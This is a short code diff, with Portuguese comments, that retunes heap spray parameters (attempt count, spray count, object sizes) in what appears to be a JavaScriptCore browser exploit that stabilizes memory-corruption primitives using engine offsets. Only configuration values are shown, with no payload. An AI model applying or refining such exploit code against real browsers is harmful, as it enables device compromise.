@@ -69,11 +69,11 @@ export async function testAndStabilizeCorePrimitives(logFn, pauseFn) {
         // Parâmetros de configuração para o heap spray.
         // ***** AJUSTE ESTES VALORES PARA EXPERIMENTAR *****
         const SPRAY_CONFIG = {
-            ATTEMPTS: 301,        // Número de tentativas para estabilizar.
+            ATTEMPTS: 302,        // Número de tentativas para estabilizar.
             GC_INTERVAL: 10,      // Forçar Garbage Collection a cada X tentativas.
-            SPRAY_COUNT: 1000,     // Número de objetos de lixo para alocar em cada tentativa.
+            SPRAY_COUNT: 10000,     // Número de objetos de lixo para alocar em cada tentativa.
             OBJECT_SIZE_MIN: 8,
-            OBJECT_SIZE_MAX: 256
+            OBJECT_SIZE_MAX: 64
         };
 
         success = await stabilizeCorePrimitives(logFn, pauseFn, JSC_OFFSETS, SPRAY_CONFIG);
